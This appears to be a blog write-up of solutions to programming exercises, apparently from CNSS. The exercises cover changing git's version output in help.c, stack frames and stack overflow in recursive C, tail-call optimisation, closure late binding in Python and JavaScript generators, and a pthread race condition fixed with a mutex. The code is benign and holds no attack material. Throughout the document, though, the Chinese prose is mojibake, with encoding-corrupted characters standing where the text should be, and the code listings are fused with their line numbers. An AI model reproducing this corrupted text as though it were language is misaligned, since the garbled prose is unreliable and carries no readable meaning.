çš„ç‰ˆæœ¬ä¿¡æ¯ç”± git --version å‘½ä»¤ç”Ÿæˆï¼Œè¾“å‡ºgit versionï¼Œä¸‹é¢æˆ‘ä»¬è¿›è¡ŒæŸ¥æ‰¾ï¼š 1grep -r &quot;git version&quot; . æŠŠå¤§é‡è¾“å‡ºå–‚ç»™GPTå‘ç°ï¼š 123./help.c: * with external projects that rely on the output of &quot;git version&quot;../help.c: strbuf_addf(buf, &quot;git version %s\\n&quot;, git_version_string);./help.c: N_(&quot;git version [--build-options]&quot;), Here it is! åœ¨vscodeä¸­æŸ¥æ‰¾å¹¶ç¼–è¾‘help.cæ–‡ä»¶ï¼Œä¿®æ”¹è¾“å‡ºå³å¯ã€‚ 12strbuf_addf(buf, &quot;git version %s\\n&quot;, git_version_string);=&gt; strbuf_addf(buf, &quot;&lt;-- CNSS --&gt; git version %s I l0v3 Sh1v3r~\\n&quot;, git_version_string); é‡æ–°makeä¸€ä¸‹ï¼Œè¾“å‡ºæ—¶å‘ç°åé¢å¤šäº†ä¸€ä¸ªdirtyã€‚æ˜¯ä¿®æ”¹äº†help.cå´æ²¡æäº¤æ›´æ”¹çš„ç¼˜æ•…ã€‚ å¯ä»¥çœ‹åˆ°è¾“å‡º&lt;-- CNSS --&gt; git version 2.46.2.628.g6258f68c3c.dirty I l0v3 Sh1v3r~ âš’ï¸Dig and Dig ssgæ˜¯ä¸€åèµ„æ·±çš„Minecraftç©å®¶ï¼Œå¹³æ—¶æœ€å–œæ¬¢çš„å°±æ˜¯åœ¨MCçš„è¾½é˜”åœŸåœ°ä¸Šå¯»æ‰¾çè´µçš„çŸ¿çŸ³ã€‚ CH1ä»åŸç‰ˆåˆ°æ•´åˆåŒ…ï¼Œä»æˆ‘çš„ä¸–ç•Œåˆ°æ³°æ‹‰ç‘äºšï¼ŒssgæŒ–çŸ¿çš„è¶³è¿¹åˆ†å¸ƒåœ¨å„ä¸ªé¢†åŸŸã€‚ æœ‰ä¸€å¤©ï¼Œä»–çªç„¶å¥½å¥‡æƒ³æŒ–æŒ–çœ‹ Cè¯­è¨€ç¨‹åºï¼Œäºæ˜¯ä»–å†™ä¸‹äº†è¿™æ®µä»£ç ï¼š 123456789101112131415161718192021222324#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int depth;void Dig (int digging) { if (digging &lt; 0) { return ; } int where_are_we; printf(&quot;In depth %d, we are at %p \\n&quot;, (depth - digging), (void *) &amp;where_are_we); Dig(digging - 1);}int main() { printf(&quot;Today we will dig: &quot;); scanf(&quot;%d&quot;, &amp;depth); printf(&quot;Let begin!\\n&quot;); Dig(depth);} ä»–å†³å®šå…ˆå‘ä¸‹é¢æŒ–æ˜ 10 ä¸ªå‡½æ•°çš„æ·±åº¦ï¼Œäºæ˜¯ä»–å°†depth å˜é‡è®¾ç½®ä¸ºäº† 10 å¹¶å¾—åˆ°äº†è¿™æ ·çš„ç»“æœï¼š Today we will dig: 10Let begin!In depth 0, we are at 0x7fffbc3fea14In depth 1, we are at 0x7fffbc3fe9e4In depth 2, we are at 0x7fffbc3fe9b4In depth 3, we are at 0x7fffbc3fe984In depth 4, we are at 0x7fffbc3fe954In depth 5, we are at 0x7fffbc3fe924In depth 6, we are at 0x7fffbc3fe8f4In depth 7, we are at 0x7fffbc3fe8c4In depth 8, we are at 0x7fffbc3fe894In depth 9, we are at 0x7fffbc3fe864In depth 10, we are at 0x7fffbc3fe834 çœ‹èµ·æ¥ä¸é”™ï¼Œäºæ˜¯ä»–å†³å®šç»§ç»­å‘ä¸‹æŒ–ï¼Œä½†ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œå½“ depth è¶³å¤Ÿå¤§æ—¶ï¼Œç¨‹åºå°±ç»ˆæ­¢è¿ä½œäº†ï¼ å› æ­¤ ssg æ‰¾åˆ°ä½ ï¼Œæƒ³è¯·ä½ å¸®ä»–è§£å†³è¿™äº›é—®é¢˜ï¼š å°è¯•ä¿®æ”¹ç¨‹åºï¼Œä½¿ssgçš„è¿™ä¸ªç¨‹åºèƒ½ç»Ÿè®¡ä»– æ€»å…± èƒ½å¤Ÿå‘ä¸‹æŒ–æ˜å¤šå°‘ä¸ª Byteã€‚å¤šæ¬¡è¿è¡Œè¿™ä¸ªç¨‹åºï¼Œæ¯æ¬¡èƒ½å‘ä¸‹æŒ–çš„Byteæ˜¯å›ºå®šçš„å—ï¼Ÿ è¿è¡Œåˆå§‹ç¨‹åºçœ‹çœ‹depthçš„æœ€å¤§å€¼ï¼Œå‘ç°æ¯æ¬¡è¿è¡Œå¾—åˆ°çš„æœ€å¤§æ·±åº¦ç›¸è¿‘ä½†ä¸åŒã€‚æ¯”å¦‚ï¼š 123456789101112$ ./digToday we will dig: 1000000Let begin!...In depth 174513, we are at 0x7ffcccda07a4[1] 2146 segmentation fault ./dig# ----------------------------------- #In depth 174450, we are at 0x7ffda0d677a4[1] 2165 segmentation fault ./dig# ----------------------------------- #In depth 174576, we are at 0x7ffc72f5f7a4[1] 2688 segmentation fault ./dig ç¬¬ä¸€æ¬¡è¿è¡Œï¼Œç¨‹åºåœ¨174513å¤„å´©æºƒï¼Œè€Œç¬¬äºŒæ¬¡è¿è¡Œåœ¨174450å¤„å´©æºƒï¼Œæ“ä½œç³»ç»Ÿä¸ºè¿›ç¨‹åˆ†é…çš„æ ˆç©ºé—´æ¯æ¬¡å¯èƒ½ä¼šç•¥æœ‰ä¸åŒï¼Œå› æ­¤è¿™äº›æ·±åº¦å€¼å¹¶ä¸å®Œå…¨ä¸€è‡´ã€‚segmentation faultçš„æ®µé”™è¯¯å‘ç”Ÿåœ¨ç¨‹åºè¯•å›¾è®¿é—®æœªè¢«å…è®¸è®¿é—®çš„å†…å­˜åŒºåŸŸæ—¶ã€‚ [1] æ˜¯Linuxç³»ç»Ÿä¸ºæ¯ä¸ªåå°ä»»åŠ¡åˆ†é…çš„ä½œä¸šå·ï¼Œ1è¡¨ç¤ºè¿™æ˜¯å½“å‰ä¼šè¯çš„ç¬¬ä¸€ä¸ªåå°è¿›ç¨‹ã€‚ 2146å’Œ2165æ˜¯è¿›ç¨‹IDï¼Œæ˜¯ç³»ç»Ÿä¸ºæ¯ä¸ªè¿è¡Œç¨‹åºåˆ†é…çš„å”¯ä¸€æ ‡è¯†ç¬¦ã€‚ è®°å½•ä¸€ä¸‹åˆå§‹åœ°å€ï¼Œç”¨where_are_weå‡åˆå§‹åœ°å€å¾—åˆ°æ‰€åœ¨æ·±åº¦ï¼š 123456789101112131415161718192021222324252627282930#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int depth;void *initial_address = NULL;void Dig (int digging) { if (digging &lt; 0) { return ; } int where_are_we; if (initial_address == NULL) { initial_address = &amp;where_are_we; } int current_depth_bytes = abs((char *) initial_address - (char *) &amp;where_are_we); printf(&quot;In depth %d, we are at %p, depth in bytes: %d \\n&quot;, (depth - digging), (void *) &amp;where_are_we, current_depth_bytes); Dig(digging - 1);}int main() { printf(&quot;Today we will dig: &quot;); scanf(&quot;%d&quot;, &amp;depth); printf(&quot;Let begin!\\n&quot;); Dig(depth); return 0;} è¿è¡Œä¸€ä¸‹ç¨‹åºï¼š 1234567$ ./digToday we will dig: 100Let begin!In depth 0, we are at 0x7ffdd7afae10, depth in bytes: 0In depth 1, we are at 0x7ffdd7afade0, depth in bytes: 48...In depth 100, we are at 0x7ffdd7af9b50, depth in bytes: 4800 å‘ç°æ¯æ¬¡èƒ½å‘ä¸‹æŒ–çš„å­—èŠ‚æ•°æ˜¯å›ºå®šçš„48å­—èŠ‚ã€‚ å°è¯•è§£é‡Šä¸ºä»€ä¹ˆdepthè¶³å¤Ÿå¤§æ—¶ç¨‹åºä¼šåœæ­¢è¿è¡Œã€‚ é€’å½’æ·±åº¦è¿‡æ·±ï¼Œå‘ç”Ÿäº†æ ˆæº¢å‡ºã€‚å‡½æ•°çš„é€’å½’è°ƒç”¨ä¼šåœ¨æ ˆä¸Šåˆ†é…å†…å­˜ï¼Œè€Œæ ˆçš„å¤§å°æ˜¯æœ‰é™çš„ã€‚å½“é€’å½’æ·±åº¦è¶…å‡ºç³»ç»Ÿåˆ†é…ç»™ç¨‹åºçš„æ ˆå†…å­˜æ—¶ï¼Œç¨‹åºå°±ä¼šå‘ç”Ÿæ ˆæº¢å‡ºï¼Œä»è€Œå¯¼è‡´ç¨‹åºå´©æºƒã€‚ å°è¯•è§£é‡Šä¸ºä»€ä¹ˆæ¯æ¬¡å±‚æ•°çš„é—´éš”éƒ½ä¸º 48Byte, è¿™48Byteé‡Œé¢éƒ½åŒ…å«äº†äº›ä»€ä¹ˆï¼Ÿ å‡½æ•°è°ƒç”¨è¿‡ç¨‹ä¸­çš„æ ˆå¸§ç»“æ„ï¼Œè¯´æ˜è¿™ä¸ªå‡½æ•°ä¸­ä¸€ä¸ªæ ˆå¸§å¤§å°ä¸º48byteã€‚åŒ…å«ï¼šå‡½æ•°çš„è¿”å›åœ°å€ï¼Œå±€éƒ¨å˜é‡ï¼Œå‡½æ•°å‚æ•°ç­‰ã€‚ æ¯”å¦‚å°†å‡½æ•°å†…éƒ¨çš„å±€éƒ¨å˜é‡where_are_weç±»å‹æ”¹ä¸ºlongæ—¶ï¼Œå±‚æ•°é—´éš”ä¼šå˜ä¸º64byteã€‚ CH2ssgåœ¨æŒ–çŸ¿çš„æ—¶å€™æ˜¯å·¦å³æ‰‹äº¤æ›¿è¿›è¡Œçš„ï¼Œå› æ­¤ä»–æƒ³è®°å½•ä¸‹è‡ªå·±åœ¨æŒ–æ˜æ¯ä¸€å±‚æ—¶ä½¿ç”¨çš„æ˜¯å·¦æ‰‹è¿˜æ˜¯å³æ‰‹ï¼Œäºæ˜¯ä»–å†™ä¸‹äº†è¿™æ®µä»£ç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdbool.h&gt;int depth;char* WhichHand(bool hand) { return hand ? &quot;left hand&quot; : &quot;right hand&quot;;}bool Dig1 (int digging) { if( digging &lt; 0) { return 0; } bool now_hand = !Dig1(digging - 1); printf(&quot;In depth %d, we use %s \\n&quot;, (depth - digging), WhichHand(now_hand)); return now_hand;}bool Dig2 (int digging, bool hand) { if( digging &lt; 0) { return hand; } printf(&quot;In depth %d, we use %s \\n&quot;, (depth - digging), WhichHand(hand)); return Dig2(digging - 1, !hand);}int main() { printf(&quot;Today we will dig: &quot;); scanf(&quot;%d&quot;, &amp;depth); printf(&quot;Let begin!\\n&quot;); Dig1(depth); //Dig2(depth, 0);} Dig1å’ŒDig2æ˜¯ä»–ç¼–å†™çš„ä¸¤ä¸ªä¸åŒç‰ˆæœ¬ä½†æ˜¯æ•ˆæœç›¸ä¼¼çš„å‡½æ•°ï¼Œçœ‹èµ·æ¥è¿è¡Œçš„ä¸é”™ï¼š Today we will dig: 10Let begin!In depth 10, we use left handIn depth 9, we use right handIn depth 8, we use left handIn depth 7, we use right handIn depth 6, we use left handIn depth 5, we use right handIn depth 4, we use left handIn depth 3, we use right handIn depth 2, we use left handIn depth 1, we use right handIn depth 0, we use left hand ä½†ssgå‘ç°äº†ä¸€ä¸ªå¾ˆä¸¥é‡çš„é—®é¢˜ï¼Œå½“ä»–ä½¿ç”¨ O2 ä¼˜åŒ–(å³åœ¨gccç¼–è¯‘æ—¶æ·»åŠ -O2æŒ‡ä»¤)åˆ†åˆ«ç¼–è¯‘è¿è¡Œäº†ä¸¤ä¸ªä¸åŒç‰ˆæœ¬çš„å‡½æ•°åï¼Œæœ‰ä¸€ä¸ªç‰ˆæœ¬çš„å‡½æ•°ï¼Œæ— è®ºä»–å°†æ·±åº¦è®¾ç½®ä¸ºå¤šå¤§ï¼Œéƒ½å¯ä»¥æ­£å¸¸è¿è¡Œï¼ ä»–ç°åœ¨æƒ³è€ƒè€ƒä½ : å“ªä¸ªç‰ˆæœ¬çš„å‡½æ•°æ— è®ºè®¾ç½®å¤šå¤§çš„æ·±åº¦éƒ½å¯ä»¥æ­£å¸¸è¿è¡Œï¼Ÿ dig2å‡½æ•°ã€‚æˆ‘ä»¬æ¥è·‘ä¸€ä¸‹ï¼š 12345678910111213141516$ gcc -O2 -o dig1 dig1.c #O2ä¼˜åŒ–å¯ç”¨äº†åŒ…æ‹¬-Wunused-resultåœ¨å†…çš„è­¦å‘Šï¼Œæ£€æŸ¥scanfè¿”å›å€¼dig1.c: In function â€˜mainâ€™:dig1.c:34:5: warning: ignoring return value of â€˜scanfâ€™ declared with attribute â€˜warn_unused_resultâ€™ [-Wunused-result] 34 | scanf(&quot;%d&quot;, &amp;depth); |$ ./dig1Today we will dig: 1000000Let begin![1] 1727 segmentation fault ./dig# ----------------------------------- #$ ./dig2Today we will dig: 1000000Let begin!...In depth 999999, we use left handIn depth 1000000, we use right hand ä¸ºä»€ä¹ˆï¼Ÿ dig1å‡½æ•°ä»ç„¶æ˜¯ä½¿ç”¨äº†æ™®é€šé€’å½’çš„æ–¹å¼ï¼Œå³ä½¿å¼€O2ä¼˜åŒ–ç¼–è¯‘ï¼Œæ ˆç©ºé—´çš„é™åˆ¶ä¾ç„¶å­˜åœ¨ã€‚ è€Œdig2å‡½æ•°ä½¿ç”¨å°¾é€’å½’ï¼Œå¤§å¤šæ•°ç¼–è¯‘å™¨ï¼Œæ¯”å¦‚è¿™é‡Œçš„gccä¸­ï¼Œå¼€äº†O2å°¾é€’å½’å¯ä»¥è¢«ä¼˜åŒ–ä¸ºæ™®é€šå¾ªç¯å®ç°ï¼Œæ¯æ¬¡é€’å½’ä¸éœ€è¦é¢å¤–å ç”¨æ ˆå¸§ï¼Œåªéœ€å°†å‡½æ•°å‚æ•°æ”¹å˜å†è°ƒç”¨ä¸€æ¬¡ï¼Œå°±ä¸ä¼šè§¦å‘æ ˆæº¢å‡ºã€‚ è°ˆä¸€è°ˆè¿™é“é¢˜å¯¹ä½ åœ¨å®é™…é¡¹ç›®å¼€å‘ä¸­çš„å¯å‘ã€‚ ç”¨é€’å½’ï¼Œæ·±åº¦è¾ƒå¤§æ—¶ï¼Œè­¦æƒ•æ ˆæº¢å‡ºï¼› åˆç†ä½¿ç”¨å°¾é€’å½’ï¼› äº†è§£ç¼–è¯‘å™¨å’Œè¯­è¨€çš„ä¼˜åŒ–èƒ½åŠ›ï¼Œæœ‰åŠ©äºæé«˜ç¨‹åºçš„è¿è¡Œæ•ˆç‡ï¼› developersåº”å½“ç¼–å†™å¥å£®çš„ä»£ç ï¼Œåšå¥½ä»£ç æµ‹è¯•ï¼Œå…³æ³¨è¾¹ç•Œæ¡ä»¶ã€‚ ğŸ§®Primesé¦™è‚ éå¸¸ç—´è¿·äºç­›æ³•æ±‚ç´ æ•°è¡¨ï¼Œå¤§è‡´åŸç†å¦‚ä¸‹ äºæ˜¯ä»–å…ˆç”¨ JavaScript ç¼–å†™äº†ä¸‹é¢è¿™æ ·çš„ä»£ç  1234567891011121314151617function* iota(i, n) { while (i &lt; n) yield i++}function* filter(g, p) { for (x of g) { if (x % p) yield x }}g = iota(2, 100)while (true) { var {value, done} = g.next() if (done) break g = filter(g, value) console.log(value)} ç¨‹åºæˆåŠŸæ‰“å°äº† 100 ä»¥å†…çš„æ‰€æœ‰ç´ æ•°ã€‚ ä¸ºäº†è®©æ›´å¤šäººç†è§£è¿™æ®µä»£ç ï¼Œä»–åˆç¼–å†™äº† Python ç‰ˆæœ¬ 123456789101112131415161718def iota(i, n): while i &lt; n: yield i i += 1def filter(g, p): for x in g: if x % p: yield xg = iota(2, 100)try: while True: value = next(g) g = filter(g, value) print(value)except StopIteration: pass ç¨‹åºè™½ç„¶æ­£ç¡®ï¼Œä½† IDE ç»™å‡ºäº†è­¦å‘Šï¼šç”¨æˆ·å®šä¹‰çš„ filter å‡½æ•°éšè—äº† Python å†…ç½®çš„ filter å‡½æ•°ã€‚ è¯´æ¥ä¹Ÿæ˜¯ï¼Œä¸ºä»€ä¹ˆä¸ç›´æ¥ä½¿ç”¨æ›´æ³›åŒ–çš„å†…ç½® filter å‡½æ•°å‘¢ï¼Ÿäºæ˜¯ä»–åˆæŠŠç¨‹åºæ”¹æˆäº†è¿™æ ·ã€‚ 12345678910111213def iota(i, n): while i &lt; n: yield i i += 1g = iota(2, 100)try: while True: value = next(g) g = filter(lambda incoming: incoming % value, g) print(value)except StopIteration: pass å¾ˆé—æ†¾çš„æ˜¯ï¼Œç¨‹åºè¾“å‡ºçš„ç»“æœä¸å†æ­£ç¡®ã€‚åˆ°åº•æ˜¯å“ªé‡Œå‡ºäº†é—®é¢˜ï¼Ÿ åœ¨è°ƒè¯•çš„è¿‡ç¨‹ä¸­ï¼Œé¦™è‚ è§‰å¾—ä¸èƒ½å…‰è°ƒ Python ä»£ç ï¼ŒJavaScript çš„ä¹Ÿä¸èƒ½æ”¾è¿‡ã€‚ è€ƒè™‘åˆ° Python é‡‡ç”¨äº†æ›´æ³›åŒ– filter å‡½æ•°ï¼Œäºæ˜¯ä»–æŠŠåŸ JavaScript ä»£ç ä¹Ÿæ”¹æˆäº†è¿™æ ·ã€‚ 1234567891011121314151617function* iota(i, n) { while (i &lt; n) yield i++}function* filter(g, p) { for (x of g) { if (p(x)) yield x }}g = iota(2, 100)while (true) { var {value, done} = g.next() if (done) break g = filter(g, incoming =&gt; incoming % value) console.log(value)} ç«Ÿç„¶å‡ºç°äº†å’Œç¬¬äºŒä»½ Python ä»£ç ä¸€æ ·çš„é”™è¯¯è¾“å‡ºç»“æœã€‚è¿™æ˜¯å·§åˆå—ï¼Ÿ æœ¬é¢˜ç­›ç´ æ•°çš„åç¨‹å«ä»€ä¹ˆåç¨‹ï¼Ÿä½ èƒ½ç®€å•æè¿°ä¸€ä¸‹è¿™æ ·ç­›ç´ æ•°çš„è¿‡ç¨‹å—ï¼Ÿ åœ¨JavaScriptæˆ–Pythonä¸­ï¼Œåˆ©ç”¨æƒ°æ€§æ±‚å€¼çš„ç”Ÿæˆå™¨ï¼Œå¯ä»¥é€æ­¥ç”Ÿæˆä¸€ä¸ªåºåˆ—ï¼Œå¹¶èƒ½åœ¨ç­›é€‰è¿‡ç¨‹ä¸­åŠ¨æ€ä¿®æ”¹åºåˆ—ï¼Œé¿å…å ç”¨è¿‡å¤šè®¡ç®—èµ„æºã€‚ 1234567g = iota(2, 100)while (true) { var {value, done} = g.next() if (done) break g = filter(g, value) console.log(value)} æ ¸å¿ƒæ€æƒ³æ˜¯åŸƒæ‹‰æ‰˜æ–¯ç‰¹å°¼ç­›æ³•ï¼ˆSieve of Eratosthenesï¼‰ã€‚ç”Ÿæˆå™¨iotaç”Ÿæˆä¸€ä¸ªä»2åˆ°99çš„æ•´æ•°åºåˆ—gï¼Œæ¯æ¬¡è°ƒç”¨gä¸­çš„å€¼å¹¶é€šè¿‡ç”Ÿæˆå™¨filterç­›æ‰ç´ æ•°valueçš„å€æ•°ï¼Œè¾“å‡ºvalueï¼Œå†ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªæ•°è¿›è¡Œå¾ªç¯ã€‚ ä¸ºä»€ä¹ˆç¬¬äºŒä»½ Python å’Œç¬¬äºŒä»½ JavaScript çš„ä»£ç æœ‰é—®é¢˜ï¼Ÿä¸¤è€…çš„é—®é¢˜æ˜¯ä¸€æ ·çš„å—ï¼Ÿ è¯·ä½ åœ¨ç¬¬äºŒä»½ Python å’Œç¬¬äºŒä»½ JavaScript åŸºç¡€ä¸Šä¿®æ”¹ä»£ç ï¼Œåœ¨ä¸å¤±ä¸€èˆ¬æ€§çš„æƒ…å†µä¸‹è§£å†³å­˜åœ¨çš„é—®é¢˜ã€‚ ä¸¤è€…çš„é—®é¢˜ä¸ä¸€æ ·ã€‚ Pythonæ˜¯å’Œå…¶å»¶æ—¶ç»‘å®šçš„æœºåˆ¶æœ‰å…³ã€‚Pythonåœ¨çœŸæ­£æ‰§è¡Œå‡½æ•°ï¼ˆå¦‚lambdaï¼‰çš„æ—¶å€™æ‰ä¼šæŸ¥æ‰¾å˜é‡çš„å€¼ï¼Œè€Œä¸æ˜¯åœ¨å®šä¹‰å‡½æ•°æ—¶ã€‚ 1g = filter(lambda incoming: incoming % value, g) è€Œåœ¨åŒä¸€ä¸ªä½œç”¨åŸŸä¸‹ï¼Œvalueçš„å€¼å§‹ç»ˆé’ˆå¯¹åŒä¸€ä¸ªå˜é‡åœ¨å˜åŒ–ï¼Œè€Œä¸æ˜¯æ¯æ¬¡å¾ªç¯éƒ½åˆ›å»ºä¸€ä¸ªæ–°å˜é‡ã€‚å› æ­¤ï¼Œæ‰€æœ‰çš„lambdaä¸­å¼•ç”¨çš„valueéƒ½ä¼šä½¿ç”¨æœ€æ–°çš„å€¼ã€‚ å¯ä»¥é‡‡ç”¨é»˜è®¤å‚æ•°çš„æ–¹æ³•è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ 12345678910111213def iota(i, n): while i &lt; n: yield i i += 1g = iota(2, 100)try: while True: value = next(g) g = filter(lambda incoming, value=value: incoming % value, g) print(value)except StopIteration: pass è¿™æ ·ï¼Œå‚æ•°åªä¼šåˆå§‹åŒ–ä¸€æ¬¡ï¼Œè€Œåœ¨ä¹‹åçš„å¾ªç¯ä¸­ä¿æŒä¸å˜ã€‚ æ‰‹åŠ¨å³æ—¶æ•è·ã€‚ 12345678910111213def iota(i, n): while i &lt; n: yield i i += 1g = iota(2, 100)try: while True: value = next(g) g = filter((lambda value: lambda incoming: incoming % value)(value), g) print(value)except StopIteration: pass è€ŒJavaScriptæ˜¯ä¸varçš„ä½œç”¨åŸŸè§„åˆ™æœ‰å…³ã€‚varåœ¨JavaScriptä¸­çš„ä½œç”¨åŸŸæ˜¯å‡½æ•°ä½œç”¨åŸŸï¼Œè€Œä¸æ˜¯å—ä½œç”¨åŸŸã€‚å¾ªç¯ä½“ä¸­æ¯æ¬¡å£°æ˜çš„valueå®é™…ä¸Šä¼šåœ¨æ•´ä¸ªå‡½æ•°çš„ä½œç”¨åŸŸä¸­å…±äº«ï¼Œlambdaå‡½æ•°æ•è·çš„æ˜¯å¯¹åŒä¸€ä¸ªå˜é‡çš„å¼•ç”¨ï¼Œæ‰€ä»¥valueä¼šåœ¨æ¯æ¬¡å¾ªç¯åæ›´æ–°ã€‚ å¯ä»¥ä½¿ç”¨ let ä»£æ›¿ varã€‚ 1234567891011121314151617function* iota(i, n) { while (i &lt; n) yield i++}function* filter(g, p) { for (x of g) { if (p(x)) yield x }}g = iota(2, 100)while (true) { let {value, done} = g.next() if (done) break g = filter(g, incoming =&gt; incoming % value) console.log(value)} å› ä¸º let æ˜¯å—ä½œç”¨åŸŸï¼Œåœ¨æ¯æ¬¡å¾ªç¯ä¸­ä¼šä¸º value ç»‘å®šä¸€ä¸ªæ–°çš„å˜é‡ï¼Œè¿™æ ·æ¯ä¸ª lambda å‡½æ•°éƒ½èƒ½æ•è·åˆ°å½“å‰å¾ªç¯ä¸­çš„ valueï¼Œè€Œä¸æ˜¯å…±äº«çš„å…¨å±€å˜é‡ã€‚ â­æ•°æ•° è®¡ç®—æœºå¾€å¾€ä¸å¤Ÿèªæ˜ï¼ˆæˆ–è€…å¤ªè¿‡èªæ˜ï¼‰ï¼Œä»¥è‡³äºä»–åªä¼šå®Œå…¨æŒ‰ç…§ä½ çš„æŒ‡ä»¤åŠäº‹ï¼Œå°½ç®¡æœ‰æ—¶å€™ä½ è‡ªå·±éƒ½ä¸çŸ¥é“è‡ªå·±çš„æŒ‡ä»¤æ˜¯ä»€ä¹ˆå«ä¹‰ CH1è¿™é“é¢˜ç›®å¹¶ä¸éš¾ï¼Œä½ è¦åšçš„åªæ˜¯è®©è®¡ç®—æœºå­¦ä¼šæ•°æ•°è€Œå·²ã€‚ æ¯”å¦‚ï¼š 123456789101112131415161718192021222324252627#include &lt;pthread.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int work_load;void *worker(void *counter_ptr) { for(int i = 0; i &lt; work_load; i++) { (* (int *)counter_ptr) += 1; } return NULL;}int main() { printf(&quot;give the workload per thread: &quot;); scanf(&quot;%d&quot;, &amp;work_load); int counter; worker(&amp;counter); worker(&amp;counter); printf(&quot;Totally count: %d\\n&quot;, counter); return 0;} ååˆ†ç®€å•å¯¹å§ï¼Ÿä½†æ˜¯æŸ³è‹æ˜å´è®¤ä¸ºï¼Œè®©åŒä¸€ä¸ª workerå‡½æ•°è¿è¡Œä¸¤éæ•ˆç‡å¤ªä½äº†ã€‚ä¸ºä»€ä¹ˆä¸é›‡ä½£ä¸¤ä¸ª workerï¼Œ è®©ä»–ä»¬åŒæ—¶å·¥ä½œå‘¢ï¼Ÿæ¢å¥è¯è¯´ï¼Œä»–å†³å®šä½¿ç”¨ å¤šçº¿ç¨‹ï¼ äºæ˜¯ä»–ååˆ†å¥½å¿ƒçš„ç»™äº†ä½ ä¸¤ä»½ä»£ç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364// V1#include &lt;pthread.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int work_load;void *worker(void *counter_ptr) { for(int i = 0; i &lt; work_load; i++) { (* (int *)counter_ptr) += 1; } return NULL;}int main() { printf(&quot;give the workload per thread: &quot;); scanf(&quot;%d&quot;, &amp;work_load); pthread_t thread1, thread2; int counter1, counter2; pthread_create(&amp;thread1, NULL, worker, &amp;counter1); pthread_create(&amp;thread2, NULL, worker, &amp;counter2); pthread_join(thread1, NULL); pthread_join(thread2, NULL); printf(&quot;Totally count: %d\\n&quot;, counter1 + counter2); return 0;}//V2#include &lt;pthread.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int work_load;void *worker(void *counter_ptr) { for(int i = 0; i &lt; work_load; i++) { (* (int *)counter_ptr) += 1; } return NULL;}int main() { printf(&quot;give the workload per thread: &quot;); scanf(&quot;%d&quot;, &amp;work_load); pthread_t thread1, thread2; int counter; pthread_create(&amp;thread1, NULL, worker, &amp;counter); pthread_create(&amp;thread2, NULL, worker, &amp;counter); pthread_join(thread1, NULL); pthread_join(thread2, NULL); printf(&quot;Totally count: %d\\n&quot;, counter); return 0;} ä½†é—®é¢˜å‡ºç°äº†ï¼Œå°½ç®¡ç¬¬ä¸€ä»½ä»£ç å¯ä»¥æ­£å¸¸è¿è¡Œï¼Œä½†ç¬¬äºŒä»½ä»£ç åœ¨ è¾“å…¥å€¼å¾ˆå¤§ æ—¶æ€»æ˜¯å‡ºç°å¥‡æ€ªçš„åå·®ã€‚ å°è¯•è¿è¡Œæµ‹è¯•è¿™ä¸¤æ®µä»£ç ï¼Œå›ç­”ï¼š ä¸ºä»€ä¹ˆä¸¤ä»½ç›¸ä¼¼çš„ä»£ç ä¼šæœ‰ä¸åŒçš„è¾“å‡ºç»“æœï¼Ÿ V1ä¸­æ¯ä¸ªçº¿ç¨‹ç‹¬ç«‹åœ°æ“ä½œå„è‡ªçš„counter1å’Œcounter2ï¼Œäº’ä¸å¹²æ‰°ï¼Œæœ€ç»ˆæŠŠä¸¤ä¸ªè®¡æ•°å™¨çš„ç»“æœåŠ å’Œå¾—åˆ°ç­”æ¡ˆã€‚ V2ä¸­é€šè¿‡å¤šçº¿ç¨‹å¹¶å‘åœ°å¯¹åŒä¸€å˜é‡counterè¿›è¡Œä¿®æ”¹ï¼Œè¿™ç§æ“ä½œå­˜åœ¨ç«äº‰æ¡ä»¶ã€‚æ„å‘³ç€ä¸¤ä¸ªçº¿ç¨‹å¯èƒ½åŒæ—¶è¯»å†™å…±äº«å˜é‡counterï¼Œå¯¼è‡´è®¡æ•°ä¸å‡†ç¡®ï¼Œå°¤å…¶æ˜¯åœ¨å·¥ä½œè´Ÿè·è¾ƒå¤§çš„æ—¶å€™ã€‚ åœ¨ç¼–å†™å¤šçº¿ç¨‹ä»£ç æ—¶ï¼Œå¦‚ä½•é¿å…è¿™ç§é”™è¯¯ï¼Ÿ å¼•å…¥åŒæ­¥æœºåˆ¶ï¼Œä½¿ç”¨äº’æ–¥é”æ¥ä¿è¯çº¿ç¨‹çš„ç‹¬ç«‹è®¿é—®ï¼Œç¡®ä¿åœ¨åŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹å¯ä»¥æ“ä½œå˜é‡ï¼Œé¿å…ç«äº‰æ¡ä»¶ã€‚ å°è¯•åªä¿®æ”¹ worker å‡½æ•°æ¥ä½¿ç¬¬äºŒä»½ä»£ç è¾“å‡ºæ­£ç¡®ã€‚ 123456789101112131415161718192021222324252627282930313233343536//V2#include &lt;pthread.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int work_load; pthread_mutex_t lock; //é”çš„å£°æ˜void *worker(void *counter_ptr) { for(int i = 0; i &lt; work_load; i++) { pthread_mutex_lock(&amp;lock); //ä¸Šé” (* (int *)counter_ptr) += 1; pthread_mutex_unlock(&amp;lock); //è§£é” } return NULL;}int main() { printf(&quot;give the workload per thread: &quot;); scanf(&quot;%d&quot;, &amp;work_load); pthread_t thread1, thread2; int counter; pthread_mutex_init(&amp;lock, NULL); //é”çš„åˆå§‹åŒ– pthread_create(&amp;thread1, NULL, worker, &amp;counter); pthread_create(&amp;thread2, NULL, worker, &amp;counter); pthread_join(thread1, NULL); pthread_join(thread2, NULL); pthread_mutex_destroy(&amp;lock); //é”€æ¯ printf(&quot;Totally count: %d\\n&quot;, counter); return 0;} è¿è¡Œä¸€ä¸‹ï¼Œå¯¹æ¯”æ›´æ”¹å‰åï¼š 1234567$ ./countgive the workload per thread: 1000000000Totally count: 1007291379#------------------------------------------#$ ./countgive the workload per thread: 1000000000Totally count: 2000000000 